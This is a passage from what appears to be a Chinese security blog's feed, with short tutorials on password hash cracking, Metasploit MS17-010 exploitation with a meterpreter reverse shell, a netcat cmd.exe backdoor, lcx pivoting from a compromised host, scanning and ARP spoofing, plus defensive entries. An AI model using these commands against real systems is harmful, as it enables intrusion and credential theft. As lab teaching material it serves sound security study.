-c是并发数-t是运行测试时间，即10秒钟内中以每次100个请求进行测试。以上是运行Webbench测试结果，Speed显示的是每分钟响应请求数和每秒钟传输数据量，Requests显示的是成功请求数和失败请求数。 为准确得到服务器的承受压力，测试时并发数可逐渐加大，如并发100时观察一下网站负载是多少、打开页面是否流畅，当网站打开缓慢时并发是多少、网站打不开时并发又是多少。 http_load：测试web服务器的吞吐量与负载参考如下链接：https://yusi123.com/2950.html 小结1.Apache Bench,Webbench,http_load对网站压力Web性能进行测试时，为了得到更加客观和准确的数值，应该从远程访问、局域网访问和本地等多个方面进行全方位的测试。一般用127.0.0.1进行本机测试。2.当然，单纯数值判断并不准确，还要参考CPU、内存的等消耗综合考虑。这三款工具大家使用也须谨慎，防止一次上太多的负载，造成目标服务器直接因内存耗光死机，而不得不硬重启，得不偿失。 本文转载自：欲思博客 » 网站Web性能测试:ApacheBench,Webbench,http_load使用教程]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>压力测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux口令破解]]></title>
    <url>%2F2017%2F05%2F30%2FLinux%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[1.获取密码密文1cat /etc/shadow root：用户名；$6$：是表示一种类型标记为6的密码散列suans fa,这里指SHA-512哈希算法；mxuA5cdy：指的是加盐(Salt)值； 2.保存root用户的hash密文到passwd.lst文件中1cp /etc/shadow /root/Desktop/passwd.lst 由于我们只关心root账户的密码，所以删除的其他用户的信息，只保留root用户的：使用Hashcat破解(hash值比对,查表)Linux登录密码时,并不需要一条完整的/etc/shadow记录,要把上面的完整记录削减成如下形式：$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X. 3.查看加密算法Linux密码文件/etc/shadow中hash算法包括缺省的DES经典算法、MD5哈希算法($1)、Blowfish加密算法($2或$2a)和SHA哈希算法($5或$6）。因此利用hashcat工具进行破解的时候参数也不同，比如MD5哈希算法($1)，使用hashcat -m 500参数；SHA哈希算法($5或$6），使用hashcat -m 1800 参数。查看加密类型：1cat /etc/login.defs 找到ENCRYPT_METHOD对应的参数，这里能够看到是使用的SHA算法：SHA512查看SHA512对应的参数：1hashcat --/help 4.使用工具进行破解进入之前保存的passwd.lst文件所在的目录1hashcat -m 1700 -a 0 -o cracked.txt passwd.lst '/usr/share/sqlmap/txt/wordlist.txt' -m：（–hash-type=NUM）#hash种类，下面有列表，后面跟对应数字；1700：SHA512对应的参数；-a （–attack-mode=NUM）#攻击模式[ 攻击模式 ] X | Mode ===+====== 0 | Straight (字典破解) 1 | Combination (组合破解) 3 | Brute-force 6 | Hybrid Wordlist + Mask (掩码暴力破解) 7 | Hybrid Mask + Wordlist0：字典破解；-o：结果输出；cracked.txt：输出结果存放文件；passwd.lst：密文文件；‘/usr/share/sqlmap/txt/wordlist.txt’：字典文件；]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试-拒绝服务攻击]]></title>
    <url>%2F2017%2F05%2F29%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[概念拒绝服务攻击即攻击者想办法让目标机器停止提供服务，是黑客常用的攻击手段之一。其实对网络带宽进行的消耗性攻击只是拒绝服务攻击的一小部分，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web渗透测试-信息收集总结]]></title>
    <url>%2F2017%2F05%2F29%2FWeb%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[分类信息收集分为：被动信息收集和主动信息收集。被动信息收集不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集。主动信息收集和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。 收集信息项目操作系统类型1.nmap可以使用nmap的“-O”参数，来初步判断服务器系统类型：探测到操作系统为Microsoft Windows Server 2008 R2的可能性很大。2.大小写访问网站：http://www.xxx.com/index.htmlhttp://www.xxx.com/inDex.htmlWindows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。 CMS类型1.robots.txt一般的CMS会在网站根路径下的robots.txt留下相关信息：上图中，能够发现网站使用的是wordpress。 Web中间件1.访问不存在的页面探测Web中间件的指纹信息方法有很多，比如随意提交一个错误页面，Apache、IIS、nginx的默认的错误页面都是不同的，而且不同版本的错误页面也是不同的。2.站长之家SEO综合查询 Web敏感目录扫描Web目录扫描也就是通过一些保存着敏感路径的字典（如：后台路径、在线编辑器路径、上传路径、备份文件等），对于一次网站渗透来说，对目录进行暴力猜解是前期阶段必不可少的一个步骤。如果运气好扫到了备份文件之类的，也许会事半功倍。1.御剑2.Awvs扫描器目录爬行3.dirbkali中的目录扫描器 旁站查询1.在线查询网站https://www.phpinfo.me/bing.php2.站长之家 开放端口1.nmap扫描 whois查询收集该信息，能够找到管理员的注册邮箱，为社工做准备。1.站长之家2.Linux中的whois工具]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口转发实现内网突破]]></title>
    <url>%2F2017%2F05%2F28%2F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%AA%81%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[简介lcx.exe是一个端口转发工具，使用它能够将内网主机A的3389端口数据转发到外网主机B的某个端口上，然后连接主机B的3389端口就相当于连接主机A的3389端口。lcx程序多用于被控制计算机处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登录到本机进行管理方便。因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。 转发过程分析第一步：肉鸡（处于内网环境的服务器）主动将本地192.168.1.106的3389端口流量转发至121.43.99.73（我们自己电脑的外网ip地址）的1234端口上；第二步：外网（我们自己的用于攻击的电脑）监听1234端口的流量并将其转发至本地4321端口；第三步：外网（我们自己的用于攻击的电脑）连接本地端口4321即代表连接肉鸡的3389端口。 使用方法第一步：具有外网ip的计算机：1lcx.exe -listen 2222 1111 本地具有外网ip的计算机中，监听2222端口的流量，并转发至本地的1111端口。从打印的提示信息中也可以看出，开始监听2222和1111端口，等待客户端连接到2222端口。第二步：内网被控制的服务器：1lcx.exe -slave 192.168.1.104 2222 192.168.1.139 3389 192.168.1.104：外网计算机地址2222：外网计算机端口192.168.1.139：内网被控制服务器3389：内网端口回到外网计算机查看连接状态：可以看到接受了来自192.168.1.139计算机的数据，等待另一个客户端连接1111端口。第三步：外网计算机：mstsc连接到本地的127.0.0.1:1111：lcx.exe中发送和接受的数据：]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows终端服务端口修改]]></title>
    <url>%2F2017%2F05%2F28%2FWindows%E7%BB%88%E7%AB%AF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9%2F</url>
    <content type="text"><![CDATA[Windows终端服务系统服务名称：TermService默认端口：3389 默认端口修改手动注册表修改系统终端服务安装完成后,会在注册表中增加两个键，我们可以通过修改注册表来修改终端服务端口。打开注册表：regedit，修改对应的键值：1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp 将PortNumber值改为想要设置的端口，例如5765等等。接着修改另一个键值：1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp 将PortNumber值改为想要设置的端口，需要与上面的一致。修改完成之后，需要重启电脑。 使用工具修改有一款用来修改3389端口的工具，修改之后不需要重启：读取端口：修改端口：注意需要勾选上开启远程桌面，要不然端口不会开放。主机上查看端口是否开放，查看进程PID，tasklist /svc：查看进程监听端口：netstat -ano注意，该工具修改不需要重启电脑，但是修改之前需要先关闭服务，直接切换下工具中的开关即可：]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows口令破解]]></title>
    <url>%2F2017%2F05%2F28%2FWindows%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Windows系统下的Hash密码格式Windows系统下的Hash密码格式为：用户名称:RID:LM-Hash值:NT-Hash值，例如：1Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC::: 用户名称为：AdministratorRID为：500LM-Hash值为：C8825DB10F2590EAAAD3B435B51404EENT-Hash值为：683020925C5D8569C23AA724774CE6CC Windows系统hash密码的导出可以使用专门导出hash密码的工具，例如：Pwdump7.exe使用方法：直接在命令行下运行即可。需要注意的是，导出hash的工具一般需要system权限才能运行，上图中导出的administrator用户的hash密码为：C2265B23734E0DACAAD3B435B51404EE:69943C5E63B4D2C104DBBCC15138B72B访问国外的专门破解hash密文的网站，进行破解：http://www.objectif-securite.ch/en/ophcrack.php]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[隐藏进程查看工具]]></title>
    <url>%2F2017%2F05%2F27%2F%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[一些木马或者恶意程序，为了防止用户发现，经常会使用隐藏自己的方式，推荐一款小工具能够很方便的查看隐藏进程，HideProViewer.exe。利用隐藏进程查看器可以查看到在任务管理器中无法查看到的隐藏进程，从而更好地对电脑进行监控与保护。上图中可以看出总共有127个进程，其中隐藏进程为0个，证明无隐藏进程运行，若有隐藏进程，则该隐藏进程会用红色标识，方便用户进行管理。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit中的MS17-010]]></title>
    <url>%2F2017%2F05%2F27%2FMetasploit%E4%B8%AD%E7%9A%84MS17-010%2F</url>
    <content type="text"><![CDATA[前言MS17-010漏洞的利用可以参考之前的一篇文章，Shadowbroker工具使用方法，但每次使用，需要一台windows主机和kali同时操作，比较麻烦，目前官方还有将MS17-010的利用工具加入到MSF中，可以暂时使用网友移植的模块。 Metasploit中安装ms17_010_eternalblue.rb进入MSF中的模块目录：1cd /usr/share/2017/05/27/Metasploit-framework/modules/exploits/windows/smb/ 下载模块源文件：1wget https://raw.githubusercontent.com/rapid7/2017/05/27/Metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb 模块引用了ruby_smb的插件，所以我们需要安装这个插件：1gem install ruby_smb 以上模块就安装完成，需要注意的是，该模块暂时只支持Windows7 x64和Windows Server 2008 x64两个版本，对其他版本的支持，需要作者修改代码，本菜暂时不会。安装完成之后，可以顺便更新一下Metasploit，使用命令：msfupdate。 使用方法启动MSF，msfconsole：1msfconsole 搜索工具：1search ms17_010 使用漏洞扫描模块：1use auxiliary/scanner/smb/smb_ms17_010 option查看配置选项，需要配置的参数，RHOSTS,THREADS：12set RHOSTS 192.168.1.0/24set threads 10 运行，开始扫描：1run 如下图，扫描到ip为192.168.1.6的主机存在漏洞： 该漏洞的扫描还可以使用另一个工具：ms17010scan-h-n-amd64-1.exe参数介绍：-h 192.168.0.2-n 192.168.0.0/24该工具扫描速度快，并且能够探测操作系统类型，但是不能探测操作系统位数。 使用漏洞利用模块，设置payload：12use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_tcp 需要配置的选项：RHOST，LHOST。设置完成：执行攻击：1exploit 执行成功之后，可以返回meterpreter。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows注册表详解]]></title>
    <url>%2F2017%2F05%2F24%2FWindows%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[注册表电脑中注册表被称为Windows操作系统的核心，它的工作原理实质是一个庞大的数据库，存放了关于计算机硬件的配置信息、系统和应用软件的初始化信息、应用软件和文档文件的关联关系、硬件设备的说明以及各种状态信息和数据，包括Windows操作时不断引用的信息。例如：系统中的硬件资源、硬件信息、分配正在使用的端口、每个用户的配置文件、计算机上安装的应用程序以及每个应用程序可以创建的文件类型等。主要作用：1、记录安装信息2、设置硬件3、设置软件4、定制Windows5、系统安全管理6、自动运行程序7、网络设置 注册表结构注册表中，所有的数据都是通过一种树状结构以键和子键的方式组织起来的,就象磁盘文件系统的目录结构一样。每个键都包含了一组特定的信息，每个键的键名都是和它所包含的信息相关联的。注册表的根键共有5个，全为大写，并以HKEY为前缀，这种命令约定是以Win32API的Registry函数的关键字的符号变量为基础的。它们分别为：HKEY_CLASSES_ROOT：管理文件系统，根据在Windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等信息。HKEY_CURRENT_USER：管理系统当前的用户信息，在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户登录用户名和暂存的密码，在用户登录Windows时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。HKEY_LOCAL_MACHINE：该根键存放本地计算机硬件数据，管理当前系统硬件配置，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息。HKEY_USERS：管理系统的用户信息，在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表，同时每个用户的预配置信息都存储在HKEY_USERS根键中，HKEY_USERS是远程计算机中访问的根键之一。HKEY_CURRENT_CONFIG：管理当前用户的系统配置，在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据，该用户使用过的文档列表，应用程序配置和其他有关当前用户的安装信息。 注册表由键（或称“项”）、子键（子项）和值项构成。一个键就是分支中的一个文件夹，而子键就是这个文件夹中的子文件夹，子键同样是一个键。一个值项则是一个键的当前定义，由名称、数据类型以及分配的值组成。一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。在注册表编辑器（Regedit.exe）中，数据结构显示如下，其中，360Scan键是360Safe键的子键，(默认)表示该值是默认值，值名称为空，其数据类型为REG_SZ，数据值为空。 注册表中的数据类型REG_SZ：字符串，文本字符串。REG_MULTI_SZ：多字符串，含有多个文本值的字符串。REG_BINARY：二进制数，二进制值，以十六进制显示。REG_DWORD：双字，一个32位的二进制值，显示为8位的十六进制值。 系统启动项Windows操作系统的系统启动项是在注册表中设置的，在注册表中常见的自启动位置如下：HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/2017/05/24/Windows/CurrentVersion/中的Run、RunOnce、RunOnceEx、RunServices和RunServicesOnce；HKEY_CURRENT_USER/SOFTWARE/Microsoft/2017/05/24/Windows/CurrentVersion中的Run和Runonce；HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/2017/05/24/WindowsNT/CurrentVersion/Winlogon/Notify。在这些注册表位置下，如果添加一新键值，并指定运行的程序，那么只要操作系统启动时，该程序自动启动。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[主机端口扫描]]></title>
    <url>%2F2017%2F05%2F23%2F%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[概念端口扫描就是通过连接到目标系统的TCP或UDP端口，来确定什么服务正在运行。一个端口就是一个潜在的通信通道，也就是一个入侵通道。从对黑客攻击行为的分析和收集的漏洞来看，绝大多数都是针对某一个网络服务，也就是针对某一个特定的端口的。对目标计算机进行端口扫描，能得到许多有用的信息。 扫描技术分类全连接扫描，半连接扫描，秘密扫描和其他端口扫描技术。其中，TCP connect()扫描是端口扫描最基础的一种扫描方式。TCP SYN扫描在扫描过程中没有建立完整的TCP连接，这和TCP connect()扫描不同，因此又称为半连接扫描。秘密扫描包含有TCP FIN扫描、TCPACK扫描等多种扫描方式。其他扫描技术包含有UDP扫描和IP头信息dumb扫描等。 全TCP连接扫描这是最基本的TCP扫描，实现方法最简单，直接连到目标端口并完成一个完整的三次握手过程(SYN，SYN／ACK和ACK)。Socket API提供的Connect()系统调用，用来与每一个感兴趣的目标计算机的端口进行连接。如果端口处于监听状态，那么Connect()就能成功。否则，这个端口是不能用的，即没有提供服务。这个技术的一个最大优点是不需要任何权限，系统中的任何用户都可以使用这个调用。另一个好处就是速度。如果对每个目标端口以线性的方式，使用单独的Connect()调用，那么将会花费相当长的时间，你可以通过同时打开多个套接字，从而加速扫描。这种扫描方法的缺点是很容易被目标系统检测到，并且被过滤掉。目前的系统会对连接进行记录，因此目标计算机的日志文件会显示大量密集的连接和连接出错的消息记录，并且能很快地使它关闭。如：TCP Wrapper监测程序通常用来进行监测，可以对连接请求进行控制，所以它可以用来阻止来自不明主机的全连接扫描。针对这一缺陷，便产生了TCP SYN扫描，也就是通常说的半开放扫描。优点：扫描速度快；缺点：容易被目标系统检测到，记录到日志文件。 TCP SYN扫描在这种技术中，扫描主机向目标主机的选择端口发送SYN数据段。如果应答是RST，那么说明端口是关闭的；如果应答中包含SYN和ACK，说明目标端口处于监听状态。由于在SYN扫描时，全连接尚未建立，所以这种技术通常被称为半打开扫描或者半开放扫描。SYN扫描的优点在于即使日志中对扫描有所记录，但是尝试进行连接的记录也要比全扫描少得多。缺点是在大部分操作系统下，发送主机需要构造适用于这种扫描的IP包，并且在通常情况下必须要有超级用户权限才能建立自己的SYN数据包。优点：连接的记录信息少；缺点：需要权限建立SYN数据包。 秘密扫描TCP FIN扫描对某端口发送一个TCP FIN数据报给远端主机。如果主机没有任何反馈，那么这个主机是存在的，而且正在监听这个端口；主机反馈一个TCP RST回来，那么说明该主机是存在的，但是没有监听这个端口。由于这种技术不包含标准的TCP三次握手协议的任何部分，所以无法被记录下来，从而比SYN扫描隐蔽得多，也称作秘密扫描。这种扫描技术使用FIN数据包来探测端口。当一个FIN数据包到达一个关闭的端口，数据包会被丢掉，并且会返回一个RST数据包。否则，当一个FIN数据包到达一个打开的端口，数据包只是简单的丢掉(不返回RST)。这种方法和系统实现有一定的关系，有的系统不管端口是否打开，都回复RST，如：Windows，CISCO。所以，这种技术通常适用于UNIX目标主机，跟SYN扫描类似，FIN扫描也需要自己构造IP包。优点：隐蔽；缺点：通常只适用于UNIX主机。 TCP ACK扫描这种扫描技术主要用来探测过滤性防火墙的过滤规则，无论目标端口的状态如何，如果发送ACK报文，就只能收到RST响应报文。但是对于防火墙，如果端口被过滤，要么收不到报文，要么收到ICMP(目标不可达)，相反，如果没有被过滤时则收到有关RST报文。 NULL扫描扫描主机将TCP数据包中的ACK(确认)、FIN(结束连接)、RST(重新设定连接)、SYN(连接同步化要求)、URG(紧急)、PSH(接收端将数据转由应用处理)标志位置空后发送给目标主机。若目标端口开放，目标主机将不返回任何信息。若目标主机返回RST信息，则表示端口关闭。 XMAS扫描XMAS扫描和NULL扫描类似，将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机，在目标端口开放的情况下，目标主机将不返回任何信息，若目标端口关闭，则目标主机将返回RST信息。还需要说明的是，MS Windows、Cisco、BSDI、HP/UX、MVS以及IRIX等操作系统如果采用TCP FIN、XMAS以及NULL扫描等方式进行扫描的话，对于打开的端口也会发送RST数据包，即使所有端口都关闭，也可以进行应答。在这种情况下，就可以进行TCP SYN扫描，如果出现打开的端口，操作系统就会知道是MS Windows、Cisco、BSDI、HP/UX、MVS以及IRIX中哪类了。 SYN/ACK扫描这种扫描故意忽略TCP的三次握手：SYN—SYN/ACK—ACK。这里，扫描主机不向目标主机发送SYN数据包，而先发送SYN/ACK数据包。目标主机将报错，并判断为一次错误的连接。若目标端口开放，目标主机将返回RST信息，若目标端口关闭，目标主机将不返回任何信息，数据包会被丢掉。 UDP ICMP端口不可达扫描由于UDP协议很简单，所以扫描变得相对比较困难。这是由于打开的端口对扫描探测并不发送一个确认，关闭的端口也并不需要发送一个错误数据包。幸运的是，许多主机在你向一个未打开的UDP端口发送一个数据包时，会返回一个ICMP_PORT_UNREACH错误。这样就能发现哪个端口是关闭的。由于UDP协议是面向无连接的协议，这种扫描技术的精确性高度依赖于网络性能和系统资源。另外，如果目标主机采用了大量的分组过滤技术，那么UDP扫描过程会变的非常慢。比如大部分系统都采用了 RFC1812 的建议，限定了ICMP差错分组的速率，比如LINUX系统中只允许4秒最多只发送80个目的地不可达消息，而Solaris每秒只允许发送两个不可到达消息，然而微软仍保留了它一贯的做法，忽略了RFC1812的建议，没有对速率进行任何限制，因此，能在很短的时间内扫完WINDOWS机器上所有64K 的UDP端口。说到这里，我想大家都应该心里有数，在什么情况下可以有效的使用UDP扫描，而不是一味去埋怨扫描器的速度慢了。UDP和ICMP错误都不保证能到达，因此这种扫描器必须还实现在一个包看上去是丢失的时候能重新传输。同样，这种扫描方法需要具有root权限。优点：能够很方便的判断哪些UDP端口是关闭的；缺点：扫描的精确性高度依赖于网络性能和系统资源； Nmap扫描类型12345-sT：全TCP连接扫描-sS：TCP-SYN扫描-sP：以ping方式进行扫描-sU：以UDP数据包格式进行扫描-sF,-sX,-sN：以Fin,Xmas,Null方式扫描 nmap -sP 192.168.1.100Nmap给每个扫描到的主机发送一个ICMP echo和一个ACK，被扫描主机对任何一种的响应都会被Nmap得到。这种方式可用来检测局域网内有哪些主机正在运行，还能查看到机器的MAC地址。可以使用nmap -sP 192.168.1.0/24。 nmap –sT 192.168.1.100Nmap将使用connect()系统调用打开目标机上相关端口的连接，并完成三次TCP握手。 nmap –sS 192.168.1.100使用半开SYN标记扫描，在一定程度上防止被扫描目标主机识别和记录。-sS命令将发送一个SYN扫描探测主机或网络。通过发送一个SYN包(是TCP协议中的第一个包)开始一次SYN的扫描。任何开放的端口都将有一个SYN|ACK响应。然而，攻击者发送一个RST替代ACK，连接中止。三次握手得不到实现，也就很少有站点能记录这样的探测。如果是关闭的端口，对最初的SYN信号的响应也会是RST，让nmap知道该端口不在监听。 nmap –sS –O 192.168.1.100利用不同的系统对于nmap不同类型探测信号的不同响应来辨别操作系统的类型。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows如何禁止运行某个应用程序]]></title>
    <url>%2F2017%2F05%2F23%2FWindows%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E6%9F%90%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[禁止程序运行的方法禁止非法程序运行有多种方法：注册表方法，添加dll方法，组策略方法等。 修改注册表用户可以通过修改注册表，来禁止运行某些具有危险性或不想让其运行的程序，以达到维护系统安全性的目的。 添加dll文件添加dll的方法主要是在应用程序目录下添加空dll替换系统本身的dll文件，达到程序无法启动的目的。 组策略方法组策略主要是利用微软提供的组策略中的软件限制策略实现限制程序运行。方法：1.启动组策略编辑器，运行窗口输入“gpedit.msc”：2.在“本地组策略编辑器”窗口，我们依次点击“用户配置”&gt;“管理模板”&gt;“系统”。进入“系统”设置：3.找到其中的“不运行指定的Windows应用程序”项：4.双击进入，将其改为“已启用”：然后点击左侧窗口中的显示，在“显示内容”窗口中输入我们要禁止运行的程序，例如“notepad.exe”，禁止记事本运行：5.点击应用，确定，尝试打开记事本： 取消的方法是，将前面的“已启用”改为“未配置”或者“已禁用”即可。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[何为蜜罐]]></title>
    <url>%2F2017%2F05%2F23%2F%E4%BD%95%E4%B8%BA%E8%9C%9C%E7%BD%90%2F</url>
    <content type="text"><![CDATA[什么是蜜罐？蜜罐是一种安全资源，其价值在于被扫描、攻击和攻陷。所有流入/流出蜜罐的网络流量都可能预示了扫描、攻击和攻陷。 蜜罐的作用？蜜罐的核心价值就在于对这些攻击活动进行监视、检测和分析。 蜜罐的分类？蜜罐可以按照其部署目的区分为产品型蜜罐和研究型蜜罐两类。研究型蜜罐专门用于对黑客攻击的捕获和分析，通过部署研究型蜜罐，研究人员可以对黑客攻击进行追踪和分析，捕获黑客的键击记录，了解到黑客所使用的攻击工具及攻击方法，甚至能够监听到黑客之间的交谈，从而掌握它们的心理状态等信息。研究型蜜罐需要研究人员投入大量的时间和精力进行攻击监视和分析工作。而产品型蜜罐的目的在于为一个组织的网络提供安全保护，包括检测攻击、防止攻击造成破坏及帮助管理员对攻击做出及时正确的响应等功能。一般产品型蜜罐较容易部署，而且不需要管理员投入大量的工作。蜜罐也可以按照其交互度的等级划分为低交互蜜罐和高交互蜜罐。高交互蜜罐提供完全真实的操作系统和网络服务，没有任何的模拟，从黑客角度上看，高交互蜜罐完全是其垂涎已久的“活靶子”，因此在高交互蜜罐中，我们能够获得许多黑客攻击的信息。高交互蜜罐在提升黑客活动自由度的同时，自然地加大了部署和维护的复杂度及风险的扩大。交互度反应了黑客在蜜罐上进行攻击活动的自由度。低交互蜜罐一般仅仅模拟操作系统和网络服务，较容易部署且风险较小，但黑客在低交互蜜罐中能够进行的攻击活动较为有限，因此通过低交互蜜罐能够收集的信息也比较有限。产品型蜜罐一般属于低交互蜜罐。蜜罐还可以按照其实现方法区分成物理蜜罐与虚拟蜜罐。物理蜜罐是真实的网络上存在的主机，运行着真实的操作系统，提供真实的服务，拥有自己的IP地址；虚拟蜜罐则是由一台机器模拟的，这台机器会响应发送到虚拟蜜罐的网络数据流，提供模拟的网络服务等。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用NC(NetCat)开放后门端口]]></title>
    <url>%2F2017%2F05%2F22%2F%E4%BD%BF%E7%94%A8NC-NetCat-%E5%BC%80%E6%94%BE%E5%90%8E%E9%97%A8%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[NC介绍NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，能被其它的程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。NetCat，它的实际可运行的名字叫nc，在网络工具中有“瑞士军刀”的美誉。 使用NC开放后门登录主机，window server 2003，进入NC目录，cmd下执行如下命令：1nc.exe -v -L -e cmd.exe -p 2000 -s 192.168.1.139 2000为端口号，192.168.1.139位本机（window server 2003）的ip地址，执行之后，程序会开始监听2000端口。接着在Windows 10主机上使用telnet连接2000端口，直接连上的就是window server 2003的cmd窗口，使用的命令如下：1telnet 192.168.1.139 2000 windows server 2003中会显示建立连接： NC各参数介绍]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>NC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP欺骗攻击与防御]]></title>
    <url>%2F2017%2F05%2F21%2FARP%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[ARP协议概述ARP：ip数据包常通过以太网发送，但是以太网设备并不识别32位ip地址，它们是以48位MAC地址传输以太网数据包的。因此，ip驱动器必须把ip目的地址转换成MAC目的地址。在这两种地址之间存在着某种静态的或算法的映射，常常需要查看一张表。地址解析协议(address resolution protocol，arp)就是用来确定这些映象的协议。arp工作时，送出一个含有所希望的ip地址的以太网广播数据包。目的地主机，或另一个代表该主机的系统，以一个含有ip和MAC地址对的数据包作为应答。发送者将这个地址对高速缓存起来，以节约不必要的arp通信。如果有一个不被信任的节点对本地网络具有写访问许可权，那么也会有某种风险。这样一台机器可以发布虚假的arp报文并将所有通信都转向它自己，然后它就可以扮演某些机器，或者顺便对数据流进行简单的修改。arp机制常常是自动起作用的。在特别安全的网络上，arp映射可以用固件，并且具有自动抑制协议达到防止干扰的目的。RARP：反向地址转换协议（reverse address resolution protocol）（rarp）允许局域网的物理机器从网关服务器的 arp表或者缓存上请求其 IP 地址。网络管理员在局域网网关路由器里创建一个表以映射物理地址（mac）和与其对应的 IP 地址。当设置一台新的机器时，其 rarp 客户机程序需要向路由器上的 rarp 服务器请求相应的 IP 地址。假设在路由表中已经设置了一个记录，rarp 服务器将会返回 IP 